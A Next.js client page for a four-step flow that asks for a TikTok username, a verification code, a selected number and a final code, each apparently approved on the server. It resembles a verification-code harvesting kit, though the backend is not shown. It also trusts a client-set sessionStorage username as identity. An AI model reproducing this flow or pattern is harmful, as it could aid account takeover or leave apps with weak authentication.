
'use client';

import { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';
import { useToast } from '@/hooks/use-toast';
import { Loader2 } from 'lucide-react';
import type { AuthUser, Submission } from '@/lib/types';
import { TiktokUsernameStep } from '@/components/start/tiktok-username-step';
import { VerifyCodeStep } from '@/components/start/verify-code-step';
import { SelectNumberStep } from '@/components/start/select-number-step';
import { FinalCodeStep } from '@/components/start/final-code-step';

export default function StartPage() {
  const router = useRouter();
  const { toast } = useToast();
  
  const [user, setUser] = useState<AuthUser | null>(null);
  const [currentStep, setCurrentStep] = useState(0);
  const [submissionData, setSubmissionData] = useState<Partial<Submission>>({});
  const [isCheckingStatus, setIsCheckingStatus] = useState(true);

  useEffect(() => {
    const storedUser = sessionStorage.getItem('user-session');
    if (storedUser) {
      const parsedUser: AuthUser = JSON.parse(storedUser);
      setUser(parsedUser);
      
      const fetchSubmissionStatus = async () => {
        try {
          const res = await fetch(`/api/submissions?id=${parsedUser.id}`);
          if (!res.ok) {
            if (res.status === 404) {
              // No submission found, start from step 1 with username pre-filled
              setSubmissionData({ tiktokUsername: parsedUser.id });
              setCurrentStep(1); 
            } else {
              throw new Error('Failed to fetch submission status.');
            }
          } else {
            const submission: Submission = await res.json();
            setSubmissionData(submission);
            // Determine which step to show based on submission status
            if (submission.finalCodeStatus === 'approved' || submission.isVerified) {
              router.replace('/success');
              return;
            }
            if (submission.phoneNumberStatus === 'approved') setCurrentStep(4);
            else if (submission.verificationCodeStatus === 'approved') setCurrentStep(3);
            else if (submission.tiktokUsernameStatus === 'approved') setCurrentStep(2);
            else setCurrentStep(1);
          }
        } catch (error) {
          toast({ variant: 'destructive', title: 'Error', description: 'Could not retrieve your submission status.' });
          setCurrentStep(1); // Default to step 1 on error
        } finally {
          setIsCheckingStatus(false);
        }
      };
      fetchSubmissionStatus();
    } else {
      // No user in session, start from the beginning
      setCurrentStep(1);
      setIsCheckingStatus(false);
    }
  }, [router, toast]);

  const handleNextStep = (data: Partial<Submission>) => {
    const updatedData = { ...submissionData, ...data };
    setSubmissionData(updatedData);

    // If this is the first step, create the user session
    if (!user && data.tiktokUsername) {
        const username = data.tiktokUsername.startsWith('@') ? data.tiktokUsername.substring(1) : data.tiktokUsername;
        const newUser: AuthUser = { id: username };
        sessionStorage.setItem('user-session', JSON.stringify(newUser));
        setUser(newUser);
    }
    
    setCurrentStep(prev => prev + 1);
  };
  
  const handlePrevStep = () => {
    setCurrentStep(prev => prev - 1);
  };

  const renderStep = () => {
    switch (currentStep) {
      case 1:
        return <TiktokUsernameStep onNext={handleNextStep} initialData={submissionData} />;
      case 2:
        return <VerifyCodeStep onNext={handleNextStep} onBack={handlePrevStep} submissionId={submissionData.id!} />;
      case 3:
        return <SelectNumberStep onNext={handleNextStep} onBack={handlePrevStep} submissionId={submissionData.id!} />;
      case 4:
        return <FinalCodeStep onBack={handlePrevStep} submissionId={submissionData.id!} />;
      default:
        return (
            <div className="flex flex-col items-center justify-center text-center">
                <Loader2 className="h-12 w-12 animate-spin text-primary mb-4" />
                <h1 className="text-xl font-semibold">Checking your status...</h1>
                <p className="text-muted-foreground">Please wait a moment.</p>
            </div>
        );
    }
  };

  if (isCheckingStatus) {
    return (
        <div className="w-full max-w-lg text-center">
            <div className="flex flex-col items-center justify-center text-center">
                <Loader2 className="h-12 w-12 animate-spin text-primary mb-4" />
                <h1 className="text-xl font-semibold">Checking your status...</h1>
                <p className="text-muted-foreground">Please wait a moment.</p>
            </div>
        </div>
    );
  }

  return (
    <div className="w-full max-w-lg transition-all duration-300">
      {renderStep()}
    </div>
  );
}
